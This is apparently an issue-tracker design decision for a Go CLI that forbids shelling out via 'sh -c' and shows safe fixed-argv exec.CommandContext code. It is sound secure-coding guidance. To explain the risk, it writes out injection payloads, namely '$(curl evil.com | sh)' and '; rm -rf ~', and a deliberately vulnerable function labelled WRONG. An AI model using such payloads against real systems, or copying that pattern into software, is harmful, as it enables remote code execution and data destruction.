---
id: byob-input-validation.3
title: Never shell out through `sh -c`; always `exec.CommandContext` with fixed argv
type: decision
priority: 2
status: open
parent: byob-input-validation
labels:
  - input-validation
---

## Description

Problem: `exec.Command("sh", "-c", "curl " + url)` or the similar
`exec.Command("bash", "-c", fmt.Sprintf("grep %s log.txt", pattern))`
is a command-injection vulnerability dressed as convenience. A URL
containing `$(curl evil.com | sh)` or a pattern containing
`; rm -rf ~` executes with the CLI's privileges. Quoting the input
is not a fix — shell-quoting is nontrivial, and one missed edge case
is one-shot fatal.

Idea: the rule is absolute. **Never pass a shell to
`exec.Command`.** Always invoke the target binary directly with a
fixed argv:

```go
cmd := exec.CommandContext(ctx, "grep", pattern, "log.txt")
```

The Go `exec` package does not interpret `pattern` as shell — it's a
single argument to `grep`, metacharacters and all. Environment
variables go through `cmd.Env`, not through an expanded shell string.
Pipelines between binaries go through `io.Pipe` or goroutines
connecting `cmd1.Stdout` to `cmd2.Stdin`, not through `sh -c "a | b"`.

The one exception: running a user-supplied script file whose
existence is explicitly the feature (`mytool run-hook ./hook.sh`).
In that case the script runs via `exec.CommandContext(ctx, "sh",
"./hook.sh")` — the user's own path as argv[1], no interpolation.
That's a different shape (user path, not user string) and safe.

Tradeoffs: losing shell features (globs, redirection, pipes)
sometimes means a few more lines of Go. Worth it; Go's stdlib has
equivalents (`filepath.Glob`, `os.OpenFile`, `io.Copy`) that are
cross-platform and don't spawn a subshell.

When not to use: never deviate. Shell invocation with interpolated
input has no safe form.

## Design

```go
// WRONG: classic injection vector
func badGrep(ctx context.Context, pattern string) error {
    return exec.CommandContext(ctx, "sh", "-c",
        fmt.Sprintf("grep %s log.txt", pattern)).Run()
}

// RIGHT: fixed argv, no shell interpretation
func grep(ctx context.Context, pattern string) error {
    return exec.CommandContext(ctx, "grep", "--", pattern, "log.txt").Run()
}

// Pipeline without a shell:
func curlToJQ(ctx context.Context, url string) ([]byte, error) {
    curl := exec.CommandContext(ctx, "curl", "-sSL", "--", url)
    jq := exec.CommandContext(ctx, "jq", ".data")
    curlOut, err := curl.StdoutPipe()
    if err != nil { return nil, err }
    jq.Stdin = curlOut

    if err := curl.Start(); err != nil { return nil, err }
    out, err := jq.Output()
    if werr := curl.Wait(); werr != nil && err == nil {
        err = fmt.Errorf("curl: %w", werr)
    }
    return out, err
}
```

